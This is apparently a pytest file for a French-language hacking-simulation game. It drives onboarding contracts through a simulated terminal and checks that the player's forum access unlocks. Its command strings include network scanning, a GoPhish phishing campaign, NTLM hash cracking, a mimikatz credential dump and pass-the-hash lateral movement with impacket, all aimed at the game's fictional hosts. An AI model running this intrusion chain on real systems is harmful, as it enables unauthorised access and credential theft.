import asyncio
import json
from pathlib import Path
import httpx
from engine.career import Career
from engine.onboarding import STAGES,forum_unlocked
from api import main as api


def test_new_career_chordly_sequence_and_forum_invitation(tmp_path,monkeypatch):
    profile=Career(tmp_path/'career.json')
    monkeypatch.setattr(api,'_CAREER',profile)
    monkeypatch.setattr(api,'_WORKSPACE',None)
    monkeypatch.setattr(api,'GAMES',{})
    monkeypatch.setattr(api,'CONNECTIONS',{})
    commands=[
        ['pwd','ls ~/mission','cat ~/mission/preparation.txt'],
        ['nmap -sV 10.20.0.0/24'],
        ['ssh m.leroux@10.20.0.21','Password123!'],
        ['smbclient //10.20.0.10/C$ -U it.presta%Maintenance2026! -c "get Data/contrats_2026.xlsx /home/operator/loot/contrats_2026.xlsx"'],
        ['cat ~/mission/inventaire_ancien.txt','cat ~/mission/changement_recent.txt','echo "serveur migre" > ~/mission/conclusion.txt'],
        ['gophish --config /opt/gophish/config.json','API_KEY=$(cat ~/gophish/api-key.txt)','curl -k -H "Authorization: $API_KEY" -H "Content-Type: application/json" -d @/home/operator/gophish/campaign.json https://127.0.0.1:3333/api/campaigns/'],
        ['hashcat -m 1000 ~/mission/exercice.ntlm /usr/share/wordlists/rockyou.txt'],
        ['ssh m.leroux@10.20.0.21','Password123!',r'type C:\Users\m.leroux\note.txt',r'copy C:\Users\m.leroux\note.txt C:\Users\m.leroux\preuve.txt']]
    async def run():
        async with httpx.AsyncClient(transport=httpx.ASGITransport(app=api.app),base_url='http://test') as client:
            result=await client.post('/api/profile/new',json={'handle':'n0xTrace','confirm':True,'curriculum':'classic'})
            assert result.status_code==200 and not forum_unlocked(profile.data)
            locked=await client.get('/api/forum/threads/welcome'); assert locked.status_code==403
            for idx,cid in enumerate(STAGES[:-1]):
                from engine import social
                world=social.view(profile,api._load_contracts())
                assert [c['id'] for c in world['contacts']]==['k0rvid']
                assert not world['threads'] and world['offers'][0]['id']==cid
                skipped=await client.post('/api/games',json={'contract':'morel','handle':'n0xTrace'})
                assert skipped.status_code==409
                created=await client.post('/api/games',json={'contract':cid,'handle':'n0xTrace','rng_seed':0})
                assert created.status_code==200,created.text
                gid=created.json()['id']
                for line in commands[idx]:
                    console='server' if cid=='intro_campaign' and line.startswith('gophish ') else 'main'
                    response=await client.post(f'/api/games/{gid}/terminal',json={'line':line,'console_id':console})
                    assert response.status_code==200 and response.json()['ok'],(cid,line,response.text)
                    while api.GAMES[gid].loop.pending(): api.GAMES[gid].loop.tick()
                state=api.GAMES[gid].state
                assert state.contract_outcome=='SUCCESS',(cid,state.objectives,state.terminal_files)
                profile.settle(gid,state)
                assert cid in profile.data['completed'] and not forum_unlocked(profile.data)
            assert profile.data['reputation']==40 and profile.data['money']==440
            assert api.career().view()['forum_unlocked'] is False
            # L'invitation nécessite le vrai dossier final, pas huit exercices seuls.
            created=await client.post('/api/games',json={'contract':'tuto_p0','handle':'n0xTrace'})
            assert created.status_code==200
            gid=created.json()['id']
            async def command(line,console='main'):
                response=await client.post(f'/api/games/{gid}/terminal',json={'line':line,'console_id':console})
                assert response.status_code==200 and response.json()['ok'],(line,response.text)
                while api.GAMES[gid].loop.pending(): api.GAMES[gid].loop.tick()
            await command('nmap -sV 10.20.0.0/24')
            await command('API_KEY=$(cat ~/gophish/api-key.txt)')
            await command('curl -k -H "Authorization: $API_KEY" -H "Content-Type: application/json" -d @/home/operator/gophish/campaign.json https://127.0.0.1:3333/api/campaigns/')
            await command('impacket-psexec m.leroux:Password123!@10.20.0.21','access')
            await command('smbclient //10.20.0.21/C$ -U m.leroux%Password123! -c "put /home/operator/tools/mimikatz.exe Tools/mimikatz.exe"')
            await command('C:\\Tools\\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit','access')
            digest=api.GAMES[gid].state.find_credential('it.presta','NTLM_HASH').value
            await command(f'impacket-psexec -hashes :{digest} it.presta@10.20.0.10')
            assert api.GAMES[gid].state.contract_outcome=='SUCCESS'
            profile.settle(gid,api.GAMES[gid].state)
            assert forum_unlocked(profile.data)
            assert (await client.get('/api/forum/threads/welcome')).status_code==200
    asyncio.run(run())


def test_legacy_career_is_not_relocked():
    assert forum_unlocked({'completed':['morel']})
    assert forum_unlocked({'campaign_version':2,'completed':['tuto_p0']})
